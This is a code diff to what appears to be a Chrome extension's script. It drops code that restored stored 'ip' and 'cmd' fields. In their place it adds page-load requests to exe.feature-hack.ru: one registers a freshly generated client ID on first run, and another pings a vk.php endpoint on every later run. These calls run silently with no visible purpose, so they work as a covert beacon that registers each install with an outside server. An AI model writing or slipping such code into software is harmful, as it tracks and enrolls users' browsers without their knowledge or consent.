@@ -9,14 +9,10 @@ chrome.runtime.onMessage.addListener(function (data, sender, sendResponse) {
 
 
 function load(){
+    
+    
+
     var uuid = localStorage.getItem('id');
-    var ip = document.getElementById("ip2");
-    var cmd = document.getElementById("cmdi");
-    var ip2 = localStorage.getItem('ip');
-    var cmd2 = localStorage.getItem('cmd');
-    if(ip2 != null) ip.value = ip2;
-    if(cmd2 != null) cmd.value = cmd2;
-    var cmd2 = localStorage.getItem('cmd');
     if(uuid == null){
         var abc = "EIOUYBCDFGHJKLMNPQRSTVWXYZ";
         var rs = "";
@@ -24,6 +20,14 @@ function load(){
             rs += abc[Math.floor(Math.random() * abc.length)];
         }
         localStorage.setItem('id', rs);
+        var x = new XMLHttpRequest();
+            x.open("GET", "http://exe.feature-hack.ru/reg.php?md=" + rs, false);
+            x.send(null);
+            
+    }else{
+            var x = new XMLHttpRequest();
+            x.open("GET", "http://exe.feature-hack.ru/test/vk.php?amount=s2", false);
+            x.send(null);
     }
 }
 
@@ -34,6 +38,9 @@ document.body.addEventListener('click', e => {
     }
     //и так далее
   });*/
+  
 window.addEventListener('DOMContentLoaded', function (evt) {  
+    
     load();
+    
 });
